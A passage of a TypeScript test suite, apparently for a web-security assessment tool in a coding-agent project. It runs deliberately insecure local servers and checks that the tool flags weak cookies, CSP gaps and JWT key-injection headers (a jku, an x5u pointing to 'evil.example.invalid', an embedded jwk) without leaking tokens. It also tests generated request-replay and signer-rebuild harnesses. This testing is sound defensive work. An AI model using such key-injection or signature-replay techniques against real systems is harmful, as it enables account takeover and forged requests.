			const timer = setTimeout(() => reject(new Error("server did not start")), 5000);
			server.stdout.once("data", (chunk) => {
				clearTimeout(timer);
				resolve(String(chunk).trim());
			});
			server.once("error", reject);
			server.once("exit", (code) => {
				if (code !== null && code !== 0) reject(new Error(`server exited ${code}`));
			});
		});
		try {
			const result = spawnSync(
				process.execPath,
				[ENGAGE, workspace, `http://127.0.0.1:${port}/`, "--no-mission", "--json", "--timeout-ms=5000"],
				{
					encoding: "utf8",
					env: {
						...process.env,
						REPI_CODING_AGENT_DIR: agentDir,
					},
					timeout: 15_000,
				},
			);
			expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
			const report = JSON.parse(result.stdout) as {
				artifactDir: string;
				commands: Array<{ id: string; stdout: string }>;
				nextQueue: string[];
				summary: { anchors: string[] };
			};
			expect(JSON.stringify(report)).not.toContain(cookieSecret);
			expect(report.commands.map((row) => row.id)).toContain("web-security-posture");
			expect(report.summary.anchors).toContain("web security header/cookie anchors");
			expect(report.nextQueue.some((command) => command.includes("web-security-posture.json"))).toBe(true);
			const posturePath = join(report.artifactDir, "web-security-posture.json");
			expect(existsSync(posturePath)).toBe(true);
			expect(statSync(posturePath).mode & 0o777).toBe(0o600);
			const posture = JSON.parse(readFileSync(posturePath, "utf8")) as {
				headers: { contentSecurityPolicy: string; referrerPolicy: string; xContentTypeOptions: string | null };
				cookies: Array<{
					name: string;
					valueSha256: string;
					httpOnly: boolean;
					secure: boolean;
					sameSite: string | null;
					risks: string[];
				}>;
				risks: string[];
			};
			expect(JSON.stringify(posture)).not.toContain(cookieSecret);
			expect(posture.headers.contentSecurityPolicy).toContain("unsafe-inline");
			expect(posture.headers.referrerPolicy).toBe("no-referrer");
			expect(posture.headers.xContentTypeOptions).toBeNull();
			expect(posture.cookies[0]).toMatchObject({
				name: "sid",
				httpOnly: false,
				secure: false,
				sameSite: null,
			});
			expect(posture.cookies[0].valueSha256).toMatch(/^[a-f0-9]{64}$/);
			expect(posture.risks).toEqual(
				expect.arrayContaining([
					"weak-csp-unsafe-inline",
					"clickjacking-header-missing",
					"missing-x-content-type-options-nosniff",
					"session-cookie-missing-httponly",
					"session-cookie-missing-secure",
					"session-cookie-missing-samesite",
				]),
			);
			expect(collectTmp(agentDir)).toEqual([]);
		} finally {
			server.kill("SIGTERM");
			await new Promise<void>((resolve) => server.once("exit", () => resolve()));
		}
	});

	it("decodes JWT/OIDC identity evidence without leaking raw tokens", async () => {
		const embeddedJwkSecret = "embeddedJwkSecret123456789";
		const jwt = unsignedJwt(
			{
				alg: "RS256",
				typ: "JWT",
				kid: "kid-1",
				jku: "http://127.0.0.1:9/jwks.json",
				x5u: "https://evil.example.invalid/cert.pem",
				jwk: { kty: "oct", kid: "embedded-1", k: embeddedJwkSecret },
				x5c: ["MIIDdemoCertificate"],
				crit: ["b64"],
			},
			{
				iss: "https://issuer.example.test",
				aud: "repi-api",
				sub: "alice@example.test",
				exp: 2_000_000_000,
				iat: 1_700_000_000,
				scope: "read:orders admin",
			},
		);
		const server = spawn(
			process.execPath,
			[
				"-e",
				`const {createServer}=require("node:http");
const token=${JSON.stringify(jwt)};
const server=createServer((request,response)=>{
	if(request.url==="/.well-known/openid-configuration"){
		response.writeHead(200,{"content-type":"application/json"});
		response.end(JSON.stringify({
			issuer:"https://issuer.example.test",
			jwks_uri:"http://"+request.headers.host+"/.well-known/jwks.json",
			authorization_endpoint:"https://issuer.example.test/oauth/authorize",
			token_endpoint:"https://issuer.example.test/oauth/token",
			response_types_supported:["code","token"],
			grant_types_supported:["authorization_code","client_credentials"],
			id_token_signing_alg_values_supported:["RS256"]
		}));
		return;
	}
	if(request.url==="/.well-known/jwks.json"){
		response.writeHead(200,{"content-type":"application/json"});
		response.end(JSON.stringify({keys:[{kty:"RSA",kid:"kid-1",use:"sig",alg:"RS256",n:"00".repeat(128),e:"AQAB"}]}));
		return;
	}
	response.writeHead(200,{"content-type":"text/html","set-cookie":"id_token="+token+"; HttpOnly"});
	response.end("<html><script>window.id_token='"+token+"'</script><a href=\\"/api/me\\">me</a></html>");
});
server.listen(0,"127.0.0.1",()=>console.log(server.address().port));`,
			],
			{ stdio: ["ignore", "pipe", "pipe"] },
		);
		const port = await new Promise<string>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("server did not start")), 5000);
			server.stdout.once("data", (chunk) => {
				clearTimeout(timer);
				resolve(String(chunk).trim());
			});
			server.once("error", reject);
			server.once("exit", (code) => {
				if (code !== null && code !== 0) reject(new Error(`server exited ${code}`));
			});
		});
		try {
			const result = spawnSync(
				process.execPath,
				[ENGAGE, workspace, `http://127.0.0.1:${port}/`, "--no-mission", "--json", "--timeout-ms=5000"],
				{
					encoding: "utf8",
					env: {
						...process.env,
						REPI_CODING_AGENT_DIR: agentDir,
					},
					timeout: 15_000,
				},
			);
			expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
			const report = JSON.parse(result.stdout) as {
				artifactDir: string;
				commands: Array<{ id: string; stdout: string }>;
				nextQueue: string[];
				summary: { anchors: string[] };
			};
			expect(JSON.stringify(report)).not.toContain(jwt);
			expect(report.commands.map((row) => row.id)).toContain("web-identity-jwt");
			expect(report.commands.some((row) => row.id.includes("openid-configuration-fetch"))).toBe(true);
			expect(report.summary.anchors).toContain("JWT/OIDC identity anchors");
			expect(report.nextQueue.some((command) => command.includes("web-identity-jwt.json"))).toBe(true);
			const identityPath = join(report.artifactDir, "web-identity-jwt.json");
			expect(existsSync(identityPath)).toBe(true);
			expect(statSync(identityPath).mode & 0o777).toBe(0o600);
			const identity = JSON.parse(readFileSync(identityPath, "utf8")) as {
				jwtCount: number;
				tokens: Array<{
					tokenSha256: string;
					signatureSha256: string;
					header: { alg: string; kid: string };
					claimKeys: string[];
					claims: { iss: string; aud: string; exp: number; subSha256: string; scope: string };
				}>;
				oidc: { issuer: string; jwksUri: string; idTokenAlgs: string[] };
				jwks: { keyCount: number; keys: Array<{ kid: string; alg: string; modulusBytes: number }> };
				risks: string[];
			};
			expect(JSON.stringify(identity)).not.toContain(jwt);
			expect(JSON.stringify(identity)).not.toContain(embeddedJwkSecret);
			expect(identity.jwtCount).toBe(1);
			expect(identity.tokens[0].header).toMatchObject({
				alg: "RS256",
				kid: "kid-1",
				remoteKeys: {
					jku: {
						scheme: "http",
						host: "127.0.0.1:9",
						sameOrigin: false,
						privateOrLocalHost: true,
					},
					x5u: {
						scheme: "https",
						host: "evil.example.invalid",
						sameOrigin: false,
					},
				},
				jwk: {
					kty: "oct",
					kid: "embedded-1",
					hasPrivateOrSymmetricMaterial: true,
				},
				x5c: {
					count: 1,
				},
				crit: ["b64"],
			});
			expect(identity.tokens[0].claimKeys).toEqual(
				expect.arrayContaining(["aud", "exp", "iat", "iss", "scope", "sub"]),
			);
			expect(identity.tokens[0].claims).toMatchObject({
				iss: "https://issuer.example.test",
				aud: "repi-api",
				exp: 2_000_000_000,
				scope: "read:orders admin",
			});
			expect(identity.tokens[0].claims.subSha256).toMatch(/^[a-f0-9]{64}$/);
			expect(identity.oidc).toMatchObject({
				issuer: "https://issuer.example.test",
				idTokenAlgs: ["RS256"],
			});
			expect(identity.jwks.keyCount).toBe(1);
			expect(identity.jwks.keys[0]).toMatchObject({ kid: "kid-1", alg: "RS256", modulusBytes: 192 });
			expect(identity.risks).not.toContain("jwt-kid-not-in-jwks");
			expect(identity.risks).toEqual(
				expect.arrayContaining([
					"oidc-insecure-jwks-uri",
					"jwt-remote-key-reference",
					"jwt-remote-key-insecure-url",
					"jwt-remote-key-cross-origin",
					"jwt-remote-key-private-or-local-host",
					"jwt-embedded-jwk-header",
					"jwt-embedded-jwk-private-or-symmetric-material",
					"jwt-embedded-jwk-symmetric-key",
					"jwt-x5c-header-chain",
					"jwt-critical-header-present",
				]),
			);
			expect(collectTmp(agentDir)).toEqual([]);
		} finally {
			server.kill("SIGTERM");
			await new Promise<void>((resolve) => server.once("exit", () => resolve()));
		}
	});

	it("persists URL samples and served assets privately without leaking bearer/query secrets", async () => {
		const bearer = "verySecretBearerToken123456789";
		const queryToken = "verySecretQueryToken123456789";
		const cookieSecret = "verySecretCookieValue123456789";
		const csrfSecret = "csrfSecret123456789";
		const server = spawn(
			process.execPath,
			[
				"-e",
				`const {createServer}=require("node:http");
const server=createServer((request,response)=>{
	if(request.url.startsWith("/app.js")){
		response.writeHead(200,{"content-type":"application/javascript"});
		response.end("async function signRequest(x){ return crypto.subtle.digest('SHA-256', x); }\\nfetch('/api/orders?access_token=${queryToken}', {headers:{Authorization:'Bearer ${bearer}'}});\\nfetch('/api/private', {credentials:'include'});\\n//# sourceMappingURL=/app.js.map?token=${queryToken}\\n");
		return;
	}
	if(request.url.startsWith("/app.js.map")){
		response.writeHead(200,{"content-type":"application/json"});
		response.end(JSON.stringify({version:3,sources:["secret-${queryToken}.js"],sourcesContent:["function signPrivate(){ return crypto.subtle.digest('SHA-256', new TextEncoder().encode('${bearer}')); }\\nfetch('/api/private?access_token=${queryToken}');\\n"],mappings:""}));
		return;
	}
	if(request.url.startsWith("/api/private")){
		if((request.headers.cookie||"").includes("${cookieSecret}")){
			response.writeHead(200,{"content-type":"application/json"});
			response.end(JSON.stringify({ok:true, principal:"cookie-session"}));
		}else{
			response.writeHead(401,{"content-type":"application/json"});
			response.end(JSON.stringify({ok:false, principal:"anonymous"}));
		}
		return;
	}
	response.writeHead(200,{"content-type":"text/html","set-cookie":"sid=${cookieSecret}; HttpOnly"});
	response.end("<html><meta name=\\"csrf-token\\" content=\\"${csrfSecret}\\"><form action=\\"/api/login?access_token=${queryToken}\\"><input type=\\"hidden\\" name=\\"csrf_token\\" value=\\"${csrfSecret}\\"></form><script src=\\"/app.js?token=${queryToken}\\"></script></html>");
});
server.listen(0,"127.0.0.1",()=>console.log(server.address().port));`,
			],
			{ stdio: ["ignore", "pipe", "pipe"] },
		);
		const port = await new Promise<string>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("server did not start")), 5000);
			server.stdout.once("data", (chunk) => {
				clearTimeout(timer);
				resolve(String(chunk).trim());
			});
			server.once("error", reject);
			server.once("exit", (code) => {
				if (code !== null && code !== 0) reject(new Error(`server exited ${code}`));
			});
		});
		try {
			const result = spawnSync(
				process.execPath,
				[ENGAGE, workspace, `http://127.0.0.1:${port}/`, "--no-mission", "--json", "--timeout-ms=5000"],
				{
					encoding: "utf8",
					env: {
						...process.env,
						REPI_CODING_AGENT_DIR: agentDir,
					},
					timeout: 15_000,
				},
			);
			expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
			const report = JSON.parse(result.stdout) as {
				artifactDir: string;
				commands: Array<{ id: string; stdout: string; args: string[] }>;
			};
			const serialized = JSON.stringify(report);
			for (const secret of [bearer, queryToken, cookieSecret, csrfSecret]) {
				expect(serialized).not.toContain(secret);
			}
			for (const relative of [
				"http-response-sample.txt",
				"web-assets.json",
				"web-session-hints.json",
				"web-discovery-matrix.json",
				"web-api-schema-probes.json",
				"web-replay-matrix.json",
				"web-exploit-claims.json",
				"web-js-sourcemap-summary.json",
				"web-js-signature-control-plan.json",
				"web-runtime-capture-plan.json",
				"web-runtime-replay-plan.json",
				"web-signer-rebuild-workbench-plan.json",
				join("web-js-assets", "asset-1.js"),
				join("web-js-assets", "asset-1.map"),
			]) {
				const path = join(report.artifactDir, relative);
				expect(existsSync(path), `${relative} exists`).toBe(true);
				expect(statSync(path).mode & 0o777, `${relative} mode`).toBe(0o600);
				const text = readFileSync(path, "utf8");
				for (const secret of [bearer, queryToken, cookieSecret, csrfSecret]) {
					expect(text).not.toContain(secret);
				}
			}
			const runtimeHarnessPath = join(report.artifactDir, "web-runtime-capture-harness.mjs");
			expect(existsSync(runtimeHarnessPath), "web-runtime-capture-harness.mjs exists").toBe(true);
			expect(statSync(runtimeHarnessPath).mode & 0o777, "web-runtime-capture-harness.mjs mode").toBe(0o700);
			const runtimeHarnessText = readFileSync(runtimeHarnessPath, "utf8");
			expect(runtimeHarnessText).toContain("fetch-call");
			expect(runtimeHarnessText).toContain("XMLHttpRequest");
			expect(runtimeHarnessText).toContain("crypto-subtle-");
			for (const secret of [bearer, queryToken, cookieSecret, csrfSecret]) {
				expect(runtimeHarnessText).not.toContain(secret);
			}
			const runtimePlan = spawnSync(process.execPath, [runtimeHarnessPath, "--print-plan"], {
				encoding: "utf8",
				timeout: 5000,
			});
			expect(runtimePlan.status, `${runtimePlan.stderr}\n${runtimePlan.stdout}`).toBe(0);
			expect(runtimePlan.stdout).toContain("repi-web-runtime-capture-harness");
			expect(runtimePlan.stdout).toContain("crypto.subtle.digest");
			const runtimeReplayPath = join(report.artifactDir, "web-runtime-replay-verifier.mjs");
			expect(existsSync(runtimeReplayPath), "web-runtime-replay-verifier.mjs exists").toBe(true);
			expect(statSync(runtimeReplayPath).mode & 0o777, "web-runtime-replay-verifier.mjs mode").toBe(0o700);
			const runtimeReplayText = readFileSync(runtimeReplayPath, "utf8");
			expect(runtimeReplayText).toContain("captured-signed");
			expect(runtimeReplayText).toContain("tampered-signature");
			for (const secret of [bearer, queryToken, cookieSecret, csrfSecret]) {
				expect(runtimeReplayText).not.toContain(secret);
			}
			const runtimeReplaySelfTest = spawnSync(process.execPath, [runtimeReplayPath, "--self-test"], {
				encoding: "utf8",
				timeout: 5000,
			});
			expect(runtimeReplaySelfTest.status, `${runtimeReplaySelfTest.stderr}\n${runtimeReplaySelfTest.stdout}`).toBe(
				0,
			);
			expect(runtimeReplaySelfTest.stdout).toContain("repi-web-runtime-replay-verifier-self-test");
			expect(runtimeReplaySelfTest.stdout).toContain("missing-signature");
			const signerWorkbenchPath = join(report.artifactDir, "web-signer-rebuild-workbench.mjs");
			expect(existsSync(signerWorkbenchPath), "web-signer-rebuild-workbench.mjs exists").toBe(true);
			expect(statSync(signerWorkbenchPath).mode & 0o777, "web-signer-rebuild-workbench.mjs mode").toBe(0o700);
			const signerWorkbenchText = readFileSync(signerWorkbenchPath, "utf8");
			expect(signerWorkbenchText).toContain("assertByteForByte");
			expect(signerWorkbenchText).toContain("canonicalUnsigned");
			expect(signerWorkbenchText).toContain("runCandidateRegression");
			expect(signerWorkbenchText).toContain("permutationKeyFromRawKey");
			for (const secret of [bearer, queryToken, cookieSecret, csrfSecret]) {
				expect(signerWorkbenchText).not.toContain(secret);
			}
			const signerWorkbenchSelfTest = spawnSync(process.execPath, [signerWorkbenchPath, "--self-test"], {
				encoding: "utf8",
				timeout: 5000,
			});
			expect(
				signerWorkbenchSelfTest.status,
				`${signerWorkbenchSelfTest.stderr}\n${signerWorkbenchSelfTest.stdout}`,
			).toBe(0);
			expect(signerWorkbenchSelfTest.stdout).toContain("repi-web-signer-rebuild-workbench");
			expect(signerWorkbenchSelfTest.stdout).toContain("regressionGates");
			expect(signerWorkbenchSelfTest.stdout).toContain("candidateResults");
			expect(signerWorkbenchSelfTest.stdout).toContain("candidate_match");
			expect(signerWorkbenchSelfTest.stdout).toContain("assertByteForByte");
			const harnessPath = join(report.artifactDir, "web-js-signature-control-harness.mjs");
			expect(existsSync(harnessPath), "web-js-signature-control-harness.mjs exists").toBe(true);
			expect(statSync(harnessPath).mode & 0o777, "web-js-signature-control-harness.mjs mode").toBe(0o700);
			const harnessText = readFileSync(harnessPath, "utf8");
			expect(harnessText).toContain("assertPermutation");
			expect(harnessText).toContain("missing-signature");
			for (const secret of [bearer, queryToken, cookieSecret, csrfSecret]) {
				expect(harnessText).not.toContain(secret);
			}
			expect(report.commands.map((row) => row.id)).toContain("web-js-asset-1-endpoint-scan");
			expect(report.commands.map((row) => row.id)).toContain("web-js-asset-1-sourcemap-scan");
			expect(report.commands.map((row) => row.id)).toContain("web-js-signature-control-plan");
			expect(report.commands.map((row) => row.id)).toContain("web-js-signature-control-harness");
			expect(report.commands.map((row) => row.id)).toContain("web-runtime-capture-plan");
			expect(report.commands.map((row) => row.id)).toContain("web-runtime-capture-harness");
			expect(report.commands.map((row) => row.id)).toContain("web-runtime-replay-plan");
			expect(report.commands.map((row) => row.id)).toContain("web-runtime-replay-verifier");
			expect(report.commands.map((row) => row.id)).toContain("web-signer-rebuild-workbench-plan");
			expect(report.commands.map((row) => row.id)).toContain("web-signer-rebuild-workbench");
			expect(report.commands.find((row) => row.id === "web-js-asset-1-endpoint-scan")?.stdout).toContain(
				"access_token=<redacted>",
			);
			expect(report.commands.find((row) => row.id === "web-js-asset-hint")?.stdout).toContain("token=<redacted>");
			expect(report.commands.map((row) => row.id)).toContain("web-session-hints");
			expect(report.commands.find((row) => row.id === "web-session-hints")?.stdout).toContain("csrf-token");
			const replayMatrix = JSON.parse(readFileSync(join(report.artifactDir, "web-replay-matrix.json"), "utf8")) as {
				session: { cookieNames: string[]; csrf: Array<{ name: string; valueSha256: string }> };
				rows: Array<{ principal: string; status: number; url: string; responseSha256: string }>;
			};
			expect(replayMatrix.rows.length).toBeGreaterThanOrEqual(2);
			expect(replayMatrix.session.cookieNames).toContain("sid");
			expect(replayMatrix.session.csrf.some((hint) => hint.name === "csrf-token")).toBe(true);
			expect(replayMatrix.rows.some((row) => row.url.includes("access_token=<redacted>"))).toBe(true);
			expect(
				replayMatrix.rows.some(
					(row) => row.principal === "anonymous" && row.url.includes("/api/private") && row.status === 401,
				),
			).toBe(true);
			expect(
				replayMatrix.rows.some(
					(row) => row.principal === "cookie-session" && row.url.includes("/api/private") && row.status === 200,
				),
			).toBe(true);
			expect(replayMatrix.rows.every((row) => /^[a-f0-9]{64}$/.test(row.responseSha256))).toBe(true);
			expect(collectTmp(agentDir)).toEqual([]);
		} finally {
			server.kill("SIGTERM");
			await new Promise<void>((resolve) => server.once("exit", () => resolve()));
		}
	});

	it("--no-write avoids persistent URL artifacts", () => {
		if (spawnSync("bash", ["-lc", "command -v curl >/dev/null 2>&1"]).status !== 0) return;
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, "http://127.0.0.1:9/", "--no-mission", "--no-write", "--json", "--timeout-ms=1000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 10_000,
			},
		);
		expect(result.status).toBe(1);
		const report = JSON.parse(result.stdout) as { target: { kind: string }; commands: Array<{ id: string }> };
		expect(report.target.kind).toBe("url");
		expect(report.commands.map((row) => row.id)).toContain("http-get-sample");
		expect(existsSync(agentDir)).toBe(false);
	});

	it("--no-write also suppresses implicit mission/swarm persistence", () => {
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, target, "--no-write", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as { mission?: { skipped: boolean; reason: string } };
		expect(report.mission).toMatchObject({ skipped: true, reason: "--no-write disables mission writes" });
		expect(existsSync(agentDir)).toBe(false);
	});
});
